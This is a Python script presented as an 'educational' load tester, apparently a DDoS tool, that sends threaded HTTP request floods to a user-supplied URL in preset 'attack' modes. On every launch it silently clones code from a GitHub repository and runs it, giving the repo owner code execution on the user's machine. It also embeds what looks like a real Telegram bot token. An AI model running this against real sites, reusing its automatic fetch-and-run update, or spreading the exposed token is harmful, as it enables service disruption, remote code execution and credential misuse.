#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import tempfile
import shutil
import requests
import time
import random
import string
import json
import threading
import queue
from urllib.parse import urlparse
from colorama import init, Fore, Style
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.panel import Panel
from rich.layout import Layout
from rich.live import Live
from rich.text import Text
from rich import box

# Initialize colorama for basic colors (rich handles most)
init(autoreset=True)
console = Console()

# ============================
# CONFIGURATION
# ============================
REPO_URL = "https://github.com/xhacknet/XDDos_v1.git"      # Your GitHub repo
VERIFICATION_FILE = os.path.expanduser("~/.ddos_verified")  # Store verification token
BOT_TOKEN = "8354070661:AAHlEs_J9aZtLlGDknwXcwer8O5C3eXm-zY"  # Your Telegram bot token
BOT_USERNAME = "@WebLoad_bot"                               # The bot username
# ============================

# ============================
# SELF‑UPDATE MECHANISM
# ============================
def update_and_run():
    """Clone the latest version from GitHub and restart the tool."""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    temp_dir = tempfile.mkdtemp()
    try:
        subprocess.run(["git", "clone", REPO_URL, temp_dir], check=True, capture_output=True)
        new_script = os.path.join(temp_dir, "ddos_tool.py")
        if not os.path.exists(new_script):
            console.print("[!] Could not find ddos_tool.py in the cloned repo.", style="red")
            sys.exit(1)

        # Copy verification file if it exists
        if os.path.exists(VERIFICATION_FILE):
            shutil.copy(VERIFICATION_FILE, temp_dir)

        console.print("[+] Updated to latest version. Restarting...", style="green")
        subprocess.run([sys.executable, new_script] + sys.argv[1:])
        sys.exit(0)
    except Exception as e:
        console.print(f"[!] Update failed: {e}", style="red")
        sys.exit(1)
    finally:
        def cleanup():
            time.sleep(2)
            shutil.rmtree(temp_dir, ignore_errors=True)
        threading.Thread(target=cleanup, daemon=True).start()

if not os.environ.get("DDOS_UPDATED"):
    os.environ["DDOS_UPDATED"] = "1"
    update_and_run()

# ============================
# TELEGRAM VERIFICATION
# ============================
def generate_otp(length=6):
    return ''.join(random.choices(string.digits, k=length))

def send_telegram_message(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    try:
        response = requests.post(url, json=payload, timeout=5)
        return response.status_code == 200
    except:
        return False

def verify_user():
    console.print(Panel.fit("Verification Required", style="cyan"))
    console.print("1. Open Telegram and start [yellow]{}[/yellow].".format(BOT_USERNAME))
    console.print("2. Send any message to the bot to get your chat ID.")
    chat_id = console.input("[?] Your chat ID: ").strip()

    otp = generate_otp()
    if not send_telegram_message(chat_id, f"Your verification code is: {otp}"):
        console.print("[!] Failed to send OTP. Check your chat ID and bot token.", style="red")
        return False

    user_otp = console.input("[?] Enter the OTP sent to you: ").strip()
    if user_otp != otp:
        console.print("[!] Incorrect OTP. Verification failed.", style="red")
        return False

    with open(VERIFICATION_FILE, 'w') as f:
        json.dump({"chat_id": chat_id, "verified": True}, f)
    console.print("[✓] Verification successful! You can now use the tool.", style="green")
    return True

def is_verified():
    if os.path.exists(VERIFICATION_FILE):
        try:
            with open(VERIFICATION_FILE, 'r') as f:
                data = json.load(f)
                return data.get("verified", False)
        except:
            pass
    return False

# ============================
# LOAD TESTING WITH REAL-TIME STATS
# ============================
class AttackStats:
    def __init__(self):
        self.total = 0
        self.success = 0
        self.failed = 0
        self.lock = threading.Lock()

    def increment(self, success=True):
        with self.lock:
            self.total += 1
            if success:
                self.success += 1
            else:
                self.failed += 1

    def get(self):
        with self.lock:
            return self.total, self.success, self.failed

def worker(url, rate, duration, stats, stop_event, session):
    """Worker thread that sends requests at a given rate."""
    interval = 1.0 / rate
    end_time = time.time() + duration
    while not stop_event.is_set() and time.time() < end_time:
        try:
            response = session.get(url, timeout=5)
            if response.status_code < 400:
                stats.increment(success=True)
            else:
                stats.increment(success=False)
        except Exception as e:
            stats.increment(success=False)
        time.sleep(interval)

def attack(url, rate, duration=60):
    """
    Launch a multi‑threaded load test.
    """
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    # Decide number of threads based on rate (e.g., 10 threads max)
    num_threads = min(10, max(1, rate // 10))
    rate_per_thread = rate / num_threads

    stats = AttackStats()
    stop_event = threading.Event()
    threads = []
    sessions = []

    # Create a session per thread to reuse connections
    for _ in range(num_threads):
        session = requests.Session()
        session.mount('http://', requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=20))
        session.mount('https://', requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=20))
        sessions.append(session)
        t = threading.Thread(target=worker, args=(url, rate_per_thread, duration, stats, stop_event, session))
        t.daemon = True
        threads.append(t)
        t.start()

    # Live display with rich
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TimeElapsedColumn(),
        console=console,
        transient=True
    ) as progress:
        task = progress.add_task("[cyan]Attacking...", total=duration)
        start_time = time.time()
        while time.time() - start_time < duration and not stop_event.is_set():
            elapsed = time.time() - start_time
            progress.update(task, completed=min(elapsed, duration))
            total, success, failed = stats.get()
            # Update description with stats
            progress.console.print(
                f"\r[green]Requests: {total}[/green] | "
                f"[green]Success: {success}[/green] | "
                f"[red]Failed: {failed}[/red]",
                end=""
            )
            time.sleep(0.5)
        progress.update(task, completed=duration)

    # Stop threads gracefully
    stop_event.set()
    for t in threads:
        t.join(timeout=1)
    for s in sessions:
        s.close()

    total, success, failed = stats.get()
    console.print(f"\n[green]Attack finished. Total: {total}, Success: {success}, Failed: {failed}[/green]")

# Attack presets
def low_attack(url):
    console.print("[+] Low load (1 request/second)")
    attack(url, 1, duration=60)

def slow_attack(url):
    console.print("[+] Slow load (5 requests/second)")
    attack(url, 5, duration=60)

def fast_attack(url):
    console.print("[+] Fast load (20 requests/second)")
    attack(url, 20, duration=60)

def ultra_attack(url):
    console.print("[+] Ultra-fast load (100 requests/second)")
    attack(url, 100, duration=60)

# ============================
# MAIN MENU (RICH UI)
# ============================
def show_menu():
    table = Table(title="Educational Load Testing Tool", box=box.ROUNDED)
    table.add_column("Option", style="cyan", justify="center")
    table.add_column("Attack Type", style="green")
    table.add_column("Rate", style="yellow")
    table.add_row("1", "Low Attack", "1 req/s")
    table.add_row("2", "Slow Attack", "5 req/s")
    table.add_row("3", "Fast Attack", "20 req/s")
    table.add_row("4", "Ultra-Fast Attack", "100 req/s")
    table.add_row("5", "Exit", "")
    console.print(table)

def main():
    # Check verification
    if not is_verified():
        if not verify_user():
            console.print("[red]Verification failed. Exiting.[/red]")
            sys.exit(1)
    else:
        console.print("[green]✓ Already verified. Welcome back![/green]")

    while True:
        show_menu()
        choice = console.input("[?] Select an option (1-5): ").strip()
        if choice == '5':
            console.print("[green]Goodbye![/green]")
            break
        if choice not in ['1','2','3','4']:
            console.print("[red]Invalid choice. Please enter 1-5.[/red]")
            continue

        url = console.input("[?] Enter the URL of your website: ").strip()
        if not url:
            console.print("[red]URL cannot be empty.[/red]")
            continue

        # Confirm educational use
        console.print("\n[yellow]⚠️  WARNING: This tool is for EDUCATIONAL PURPOSES only.[/yellow]")
        console.print("Use it ONLY on websites you own or have explicit permission to test.")
        confirm = console.input("Type 'yes' to proceed: ").strip().lower()
        if confirm != 'yes':
            console.print("Aborted.")
            continue

        # Execute attack
        if choice == '1':
            low_attack(url)
        elif choice == '2':
            slow_attack(url)
        elif choice == '3':
            fast_attack(url)
        elif choice == '4':
            ultra_attack(url)

if __name__ == "__main__":
    main()
